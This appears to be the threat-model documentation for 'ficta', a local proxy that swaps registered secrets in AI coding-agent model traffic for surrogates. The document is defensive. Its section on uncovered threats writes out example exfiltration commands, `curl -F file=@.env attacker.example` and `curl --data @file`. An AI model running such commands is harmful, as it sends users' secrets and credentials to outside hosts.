# Threat model

ficta is a local privacy guardrail for AI coding-agent **model traffic**. It is not a sandbox,
enterprise DLP product, compliance control, or malware/exfiltration prevention system.

## The promise

For values that ficta has loaded into its registry after applicable configured filters (for example
`registry.min_len` on unstructured env/Doppler candidates) and trusted policy exclusions (provider-declared plus the user's own
`registry.exclude_names`), such as exact values from managed registry files, `.env` files, or
Doppler, ficta attempts to:

1. replace those exact values with local surrogates before sending covered request bodies, query strings, and non-auth headers to the model provider;
2. block the request if an expected exact value would still be forwarded verbatim in a surface ficta is supposed to redact; and
3. restore surrogates back to real values locally in text/JSON/SSE responses so the coding agent keeps working.

This is an **exact-match** promise for registered values in covered redacted request surfaces, not a
general claim that all secrets or all PII are detected. Any public "security" wording should
include this scope.

## Covered by default

- Model API request bodies handled by the proxy.
- Query strings handled by the proxy.
- Non-auth request headers handled by the proxy.
- JSON/text/event-stream responses, for local surrogate restoration.
- Exact registered values that pass configured registry-source filters and policy exclusions.
- Secret-ish process environment values inherited by the wrapper, unless process-env loading is disabled.

## Intentionally not covered

- Auth headers on the built-in pass-through allowlist: `Authorization`, `Proxy-Authorization`, `x-api-key`, and `Cookie`. The upstream needs these to authenticate; other provider-specific auth headers are treated as non-auth request headers.
- Values transformed before the model sees them, such as base64, URL encoding, chunks, hashes, compression, or concatenation, unless the transformed form is also registered.
- Filtered-out unstructured registry values, such as env/Doppler values shorter than `registry.min_len` / `FICTA_REGISTRY_MIN_LEN` (a silent default of 8, no longer prompted at setup). Managed forms declare substring/token policy explicitly instead.
- Names the user excludes via `registry.exclude_names` / `FICTA_REGISTRY_EXCLUDE_NAMES`. This is a trusted un-protection channel: it is gated by the local 0600 config file (or process env), matches exact env var names only, is visible in the startup banner and `ficta doctor`, and is what `ficta review` edits. The default posture remains "redact everything discovered"; a name is only skipped once the user opts it out. `ficta review` may pre-suggest un-checking names its heuristic classifier reads as non-secret (credential-free URLs, paths, well-known config), but this only changes the prompt's default — the exclusion is still written only on explicit user confirmation, and any credential-shaped or high-entropy value is always left protected.
- Filesystem-path-like tokens **on the query string and in the request body**, even when a registered value appears inside them — so a legitimate path parameter (e.g. `?redirect_uri=/a/b`) and agent tool-call paths (`cd`, `Read`, `Edit`) are not mangled. Request **headers** do not get this preservation: a registered value inside a slash-path in a header is redacted. Do not rely on path-preservation for secrecy; `FICTA_REDACT_PATHS=1` redacts path-like tokens on every surface.
- Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system. Restore-into-tools withholding narrows the *restore-assisted* variant — a surrogate the model places in a tool-call argument stays a placeholder rather than being restored to the real value, on streamed deltas, provider replay events, and buffered (non-SSE) tool calls alike — but it is a fail-safe, not egress control. `FICTA_RESTORE_INTO_TOOLS` is tri-state: `all` restores every surrogate into tool arguments, `none` withholds every surrogate, and `detected` (the default) restores only **content-derived** detections (secret-shapes/PII the agent already read locally) while withholding **registry/environment** secrets — the values the model only ever saw as placeholders. The `detected` default is chosen because a compromised model can already exfiltrate local file content without any placeholder (`curl --data @file`), so withholding content-derived detections only corrupts the agent's own files, whereas registry secrets stay strictly withheld. Withholding compares the whole surrogate token, reassembling one split across multiple streaming SSE fragments before deciding, so a fragmented placeholder is never restored — or passed through uncounted — by accident.
- Withholding on a response that arrives with **no content-type** on a known wire but is actually buffered JSON: such a body is treated as an event stream (the ChatGPT/Codex backend omits the header on real SSE) and falls back to a blanket text restore, so a tool-call argument in that unusual shape would be restored. Upstreams set `content-type` on JSON responses in practice; body-sniffing to close this would be more fragile than the gap it closes.
- Withholding on an **unknown wire**: with no schema there is no way to classify tool arguments, so buffered unknown-wire responses keep the blanket restore.
- Binary responses.
- Secrets the agent reads or sends outside the proxied model API channel.
- IDE clients that do not route all model traffic through the proxy, for example Cursor, whose Agent / Edit / Tab / Composer features bypass a custom base URL. See [IDE clients](#ide-clients-cursor-etc) below.

## IDE clients (Cursor, etc.)

ficta's exact-match promise requires that **all** of a client's model traffic pass through the
local proxy. CLI agents (`claude`, `codex`, `pi`) satisfy this — their base-URL override
(`ANTHROPIC_BASE_URL` and equivalents) captures every model request.

IDE clients like **Cursor** do not, so they are **not supported**:

- Cursor's base-URL override only routes its **chat/plan panel with a custom OpenAI-compatible model** to a local endpoint.
- The agentic features that actually read your files and `.env` — **Agent, Composer, Edit/Apply, Tab** — stay on Cursor's own backend and first-party models and never reach the proxy. Default first-party model usage also transits Cursor's servers.

This is **partial coverage**, which for a secret airlock is worse than none: a `.env` value swept
into Agent context is sent to the provider verbatim while the user believes ficta is protecting
them. Pointing Cursor at the ficta proxy would cover only chat-panel custom-model requests and
silently leak the dominant agentic path. Per the positioning guardrails below, ficta must not
claim Cursor protection on that basis.

If a future Cursor build routes **all** model traffic (including Agent/Edit/Tab) through a
user-controlled base URL, revisit this — full coverage would make the same exact-match promise
honest there too.

## Design tradeoffs

- **Exact-match over broad guessing.** The reliable layer is values you already know. Detector-style matching can be added, but is best effort.
- **Fail closed for expected leaks.** If a registered value remains in a surface ficta is supposed to redact, ficta blocks rather than forwarding.
- **Usability for coding agents.** Path-like tokens on the query string and in the request body are preserved so legitimate path parameters and agent tool calls (`cd`, `Read`, `Edit`) aren't mangled — a registered value inside a real path is far more likely a path segment than a secret. Request **headers** are the exception: they rarely carry a legitimate local path, so a registered value inside a slash-path in a header is redacted, closing that leak surface at no ergonomic cost.
- **Local only.** Registry values and surrogate mappings are kept in memory for the local proxy session and are not intentionally sent anywhere except where explicitly restored locally. The proxy-internal surrogate key is not passed to child agent processes.

## Public-claim guardrails

When documenting or explaining ficta:

- Scope the strongest guarantee to registered exact values from managed registry files, `.env`,
  process env, and Doppler.
- Do not present ficta as full DLP, compliance tooling, or a substitute for enterprise controls.
- Describe PII detector plugins as best-effort additions, not as exact-match protection.
- Do not claim "never leaks" or "secure" without the covered-surface exact-match scope above.
- Do not market tool-execution exfiltration protection unless OS/container/agent controls are part
  of the setup.

## What to use alongside ficta

For stronger isolation, combine ficta with:

- a restricted workspace/filesystem sandbox;
- an outbound network allowlist or container-level egress policy;
- strict coding-agent tool permissions; and
- normal secret hygiene: don't put real secrets in filenames, prompts, docs, screenshots, or public logs.
